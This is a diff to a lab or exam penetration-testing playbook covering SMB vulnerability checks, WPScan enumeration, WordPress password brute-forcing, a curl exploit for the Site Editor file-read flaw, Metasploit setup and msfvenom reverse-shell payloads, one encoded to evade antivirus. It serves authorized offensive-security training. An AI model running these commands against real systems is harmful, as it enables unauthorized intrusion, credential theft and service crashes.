@@ -87,7 +87,7 @@ Optionally search the completed XML version scan for local Exploit-DB candidates
 searchsploit --nmap results.xml
 ```
 
-A match is a lead, not proof. Check the exact product, version, target OS, architecture, access requirements and side effects in **EXP-01** before selecting one candidate. No match does not close the service-specific branch.
+`searchsploit --nmap` is a convenience search. It can miss correlations between a service, OS build and advisory. A match is a lead, not proof; check the exact product, version, target OS, architecture, access requirements and side effects in **EXP-01**. No match does not close the service-specific branch.
 
 | Result | Next |
 | --- | --- |
@@ -274,14 +274,25 @@ For a supplied account, use `-U '<DOMAIN_OR_SERVER>\<USERNAME>'` and let smbclie
 smbclient -L '<TARGET_IP>' -p '<SMB_PORT>' -U '<DOMAIN_OR_SERVER>\<USERNAME>' --timeout 15
 ```
 
-An OS, service pack or SMB dialect match is only a vulnerability candidate. For example, Windows Server 2008 SP1 with SMB 2.0.2 does not prove CVE-2009-3103. If that exact hypothesis matters, first read the dedicated script warning, confirm disruptive testing and target recovery are authorized, then run it once:
+An OS, service pack or SMB dialect match is only a vulnerability candidate. For example, Windows Server 2008 SP1 with SMB 2.0.2 does not prove CVE-2009-3103. Correlate the observed OS/build, SMB generation and service evidence with local source, then map its affected-version claims to a vendor advisory and CVE. Search installed checks only after that mapping:
 
 ```bash
-nmap --script-help smb-vuln-cve2009-3103
-sudo nmap -Pn -n -p445 --script smb-vuln-cve2009-3103 --script-timeout 180s '<TARGET_IP>'
+searchsploit --disable-colour '<OBSERVED_OS_OR_SERVICE>' '<OBSERVED_VERSION_OR_SMB_DIALECT>'
+searchsploit -x <EDB_ID>
+find /usr/share/nmap/scripts -maxdepth 1 -type f -iname 'smb-vuln*.nse' -printf '%f\n'
 ```
 
-That NSE script is intrusive and DoS-capable. A vulnerable host may crash or reset. Do not repeat it while the host or TCP 445 is unstable; wait for recovery or reset the lab, then recheck basic SMB reachability before another attempt.
+Use **MSF-01** to search installed Metasploit modules by the mapped CVE or product. Treat source comments and module names as leads until the advisory's exact affected releases and conditions match.
+
+Before any SMB vulnerability script, inspect `nmap --script-help '<SCRIPT>'` and note `intrusive`, `exploit` or `dos` categories. Run a destructive check only with explicit authorization and a working reset or recovery path. Run it once, then check the specific service rather than repeating the vulnerability probe:
+
+```bash
+nmap --script-help '<SMB_VULN_SCRIPT>'
+sudo nmap -Pn -n -p445 --script '<SMB_VULN_SCRIPT>' --script-timeout 180s '<TARGET_IP>'
+nmap -Pn -n -sV -p445 '<TARGET_IP>'
+```
+
+Some SMB checks, including the CVE-2009-3103 check, are intrusive and DoS-capable. A vulnerable host may crash or reset. If the host or TCP 445 is unstable, recover or reset the lab and do not repeat the check.
 
 | Result | Next |
 | --- | --- |
@@ -592,20 +603,95 @@ Read the request in Network: file field, accepted type, required fields, returne
 Enter only when the exact product is confirmed by the response or an admin view.
 
 ```bash
-wpscan --url '<INSTALLATION_URL>' --enumerate ap,at --no-update
 droopescan scan <CONFIRMED_CMS> -u '<INSTALLATION_URL>'
 searchsploit --disable-colour --title '<PRODUCT>' '<VERSION>'
 searchsploit --path '<EDB_ID>'
 ```
 
-Use only the matching CMS command. A `?ver=` value is not a version.
+Use droopescan only for a matching supported CMS. WordPress goes to **WEB-28**. A `?ver=` value is not a confirmed version.
 
 | Result | Next |
 | --- | --- |
+| WordPress confirmed | **WEB-28**. |
 | Component and version confirmed | **EXP-01** with the local source. |
 | More paths seen | **WEB-04**. |
 | Version still uncertain | **WEB-03**. |
 | No local source | **PAUSE-COVERAGE**. |
+
+## WEB-28. Enumerate one confirmed WordPress installation with WPScan
+
+Enter when the response confirms WordPress through `/wp-content/`, `/wp-admin/`, `/wp-login.php`, `/wp-json/` or equivalent page source. Use the exact installation root without a trailing slash, including a subdirectory when WordPress is not at `/`.
+
+If the IP redirects to an in-scope hostname, add that exact mapping to `/etc/hosts`, then scan the hostname rather than the IP:
+
+```text
+sudoedit /etc/hosts
+<TARGET_IP>    <WORDPRESS_HOSTNAME>
+```
+
+Update a stale local database. Load the API token without putting it in shell history; WPScan reads `WPSCAN_API_TOKEN` automatically. The token adds vulnerability data, but enumeration still works without it.
+
+```bash
+wpscan --update
+read -rsp 'WPScan API token: ' WPSCAN_API_TOKEN; export WPSCAN_API_TOKEN; printf '\n'
+wpscan --url '<WORDPRESS_ROOT>' \
+  --enumerate ap,at,u,cb,dbe \
+  --detection-mode aggressive \
+  --plugins-detection aggressive \
+  --plugins-version-detection aggressive \
+  --output wpscan.txt \
+  --format cli-no-colour \
+  --verbose
+```
+
+The combined scan is the default. Use a focused retry only when one part is missing or unclear:
+
+```bash
+# Users
+wpscan --url '<WORDPRESS_ROOT>' --enumerate u --detection-mode aggressive --verbose
+
+# Plugins
+wpscan --url '<WORDPRESS_ROOT>' --enumerate ap \
+  --plugins-detection aggressive --plugins-version-detection aggressive --verbose
+
+# Themes
+wpscan --url '<WORDPRESS_ROOT>' --enumerate at \
+  --themes-detection aggressive --themes-version-detection aggressive --verbose
+```
+
+For an authorized password test, use only confirmed usernames. Start with the supplied or short box-specific list; use `rockyou.txt` only when the lab permits the larger attempt and the endpoint stays stable.
+
+```bash
+wpscan --url '<WORDPRESS_ROOT>' --usernames users.txt --passwords passwords.txt
+wpscan --url '<WORDPRESS_ROOT>' \
+  --usernames '<CONFIRMED_USERNAME>' \
+  --passwords /usr/share/wordlists/rockyou.txt
+```
+
+Keep `wpscan.txt` with the report. Confidence is scanner evidence, not proof. Confirm the reachable component path and version, then inspect the local source before trying a candidate:
+
+```bash
+searchsploit --disable-colour --title 'WordPress <PLUGIN_OR_THEME>' '<VERSION>'
+searchsploit -x <EDB_ID>
+```
+
+ColdBoxEasy example: Site Editor through 1.1.1 maps to EDB-ID 44340 and CVE-2018-7422. This is a pre-foothold file-read check, not post-exploitation enumeration. Use it only after the plugin and affected version match:
+
+```bash
+searchsploit -x 44340
+curl -sS -i --get \
+  '<WORDPRESS_ROOT>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php' \
+  --data-urlencode 'ajax_path=/etc/passwd'
+```
+
+| Result | Next |
+| --- | --- |
+| Plugin or theme and affected version confirmed | **EXP-01** with the saved local source. |
+| Site Editor returns the requested local file | **WREAD-01**. |
+| A permitted credential works | **WEB-09**. |
+| More WordPress paths appear | **WEB-04**. |
+| Only a version hint or low-confidence match appears | **WEB-03**. |
+| Scan is rate limited or destabilizes the endpoint | **PAUSE-COVERAGE**. |
 
 ## WEB-12. Check default files software and WebDAV
 
@@ -4103,7 +4189,7 @@ sha256sum <EDB_ID>.py
 
 Read the header and the trigger path before using it. A managed module is an alternative only when its options are known.
 
-Compare the candidate with the exact product/version, the function you reached, OS and process architecture, required configuration or input, callback route, payload constraints, and recovery. A title or banner match is not applicability.
+Compare the candidate with the exact product/version and function reached. For OS or SMB candidates, match the exact release, including R2 versus non-R2, build family, target and process architecture, protocol generation, and patch or vulnerability evidence. Check required configuration or input, callback route, payload constraints, crash risk and recovery. An unknown fact is unconfirmed, not a match; a title or banner match is not applicability.
 
 | Result | Next |
 | --- | --- |
@@ -4337,15 +4423,14 @@ MSF is allowed on one target per exam attempt. Use manual paths first and spend 
 ```text
 msfconsole -q
 search <PRODUCT> <VERSION>
+search cve:<CVE> type:exploit
 use <MODULE_NUMBER>
 info
-show targets
-show payloads
 ```
 
 Read the module's rank, target, payload, required options and side effects. `check` when the module supports it. Record the module path and version; rank tells you how reliable it is.
 
-For a kernel SMB exploit, verify the target OS/build and architecture against `show targets`, and verify the payload architecture against `show payloads`. Record the crash risk, the exposed `WAIT` value and a working reset/recovery path before `check` or `run`. Some modules, including `ms09_050_smb2_negotiate_func_index`, accept x86 payloads only.
+For a kernel SMB exploit, carry the observed OS/build and architecture into **MSF-02**. Record the crash risk, the exposed `WAIT` value and a working reset/recovery path before `check` or `run`. Some modules, including `ms09_050_smb2_negotiate_func_index`, accept x86 payloads only.
 
 | Result | Next |
 | --- | --- |
@@ -4355,20 +4440,28 @@ For a kernel SMB exploit, verify the target OS/build and architecture against `s
 | Prerequisites differ | **EXP-01** with the manual path. |
 | No module | **EXP-01**. |
 
-## MSF-02. Configure one attempt
+## MSF-02. Configure, review, then dispatch one attempt
 
 ```text
 use <MODULE_NUMBER>
 set RHOSTS <TARGET_IP>
 set RPORT <PORT>
-set LHOST <KALI_IP>
+set TARGET <TARGET_INDEX>
+set LHOST <ROUTE_SRC_IP>
 set LPORT <LPORT>
 set PAYLOAD <COMPATIBLE_PAYLOAD>
 show options
-run
+show targets
+show payloads
 ```
 
-Set only options with no default; review the payload, target index and architecture. The Metasploit module and its handler own the configured callback port, so do not start a separate listener on that port. Use a manual listener only for a standalone payload intentionally run outside the module handler. This attempt consumes the allowance for one target.
+Set every required value that is blank or wrong; do not trust a default `LHOST` until it matches **PAY-01**. Before dispatch, verify the selected target index, the selected payload's architecture, and every required option. The module and its handler own the configured callback port, so do not start netcat or another listener on that port. Use a manual listener only for a standalone payload intentionally run outside the module handler.
+
+Only after that review, dispatch once. This consumes the allowance for one target:
+
+```text
+run
+```
 
 | Result | Next |
 | --- | --- |
@@ -4410,13 +4503,13 @@ Cleanup: remove forwards and routes (`portfwd delete`, `route remove`), kill the
 
 ## PAY-01. Reverse or bind?
 
-Reverse when the target can reach your interface; confirm first:
+Derive the callback address from the route to the target. Use the address after `src` as `LHOST`:
 
 ```bash
-nc -lvnp '<LPORT>'
+ip route get '<TARGET_IP>'
 ```
 
-Bind when egress is blocked: the target listens, and you reach it through a tunnel.
+Reverse requires the target to reach that address and port. Binding a local listener proves only that the local port is available; it does not prove target-to-operator reachability. Bind payloads are for cases where the target listens and you can reach it directly or through a tunnel.
 
 | Result | Next |
 | --- | --- |
@@ -4428,11 +4521,11 @@ Bind when egress is blocked: the target listens, and you reach it through a tunn
 ## PAY-02. Generate and check one payload
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f exe -o payload-x86.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f exe -o payload-x64.exe
-msfvenom -p linux/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f elf -o payload.elf
-msfvenom -p java/jsp_shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f war -o payload.war
-msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -e x64/xor_dynamic -i 3 -f exe -o payload-enc.exe
+msfvenom -p windows/shell_reverse_tcp LHOST='<ROUTE_SRC_IP>' LPORT='<LPORT>' -f exe -o payload-x86.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<ROUTE_SRC_IP>' LPORT='<LPORT>' -f exe -o payload-x64.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST='<ROUTE_SRC_IP>' LPORT='<LPORT>' -f elf -o payload.elf
+msfvenom -p java/jsp_shell_reverse_tcp LHOST='<ROUTE_SRC_IP>' LPORT='<LPORT>' -f war -o payload.war
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<ROUTE_SRC_IP>' LPORT='<LPORT>' -e x64/xor_dynamic -i 3 -f exe -o payload-enc.exe
 file payload-x86.exe payload-x64.exe
 sha256sum payload-x86.exe payload-x64.exe
 ```
@@ -4445,7 +4538,7 @@ Do not default to Windows x64. Match the payload to the target process and to an
 | Wrong arch or format | Regenerate once. |
 | AV blocks it | Encode or change format; mark optional. |
 
-Standalone listener hygiene: use one foreground listener, `ncat --listen`, `rlwrap` when interactive, and stop it with Ctrl-C after the session. When a Metasploit handler owns `LPORT`, do not bind a second listener there.
+Standalone listener hygiene: use one foreground listener, `ncat --listen`, `rlwrap` when interactive, and stop it with Ctrl-C after the session. When a Metasploit handler owns `LPORT`, netcat must not compete for that port.
 
 # pivoting
 
@@ -6408,6 +6501,10 @@ Read the upload request and delete route before creating a file.
 ## WEB-11. What decides this step?
 
 Inventory a confirmed CMS, then pick one matching local source.
+
+## WEB-28. What decides this step?
+
+WPScan inventories one confirmed WordPress root. Its confidence and vulnerability labels select a candidate; the reachable component, affected version and reviewed local source decide whether that candidate fits. A password attack starts only with a confirmed username and a permitted list.
 
 ## WEB-12. What decides this step?
 
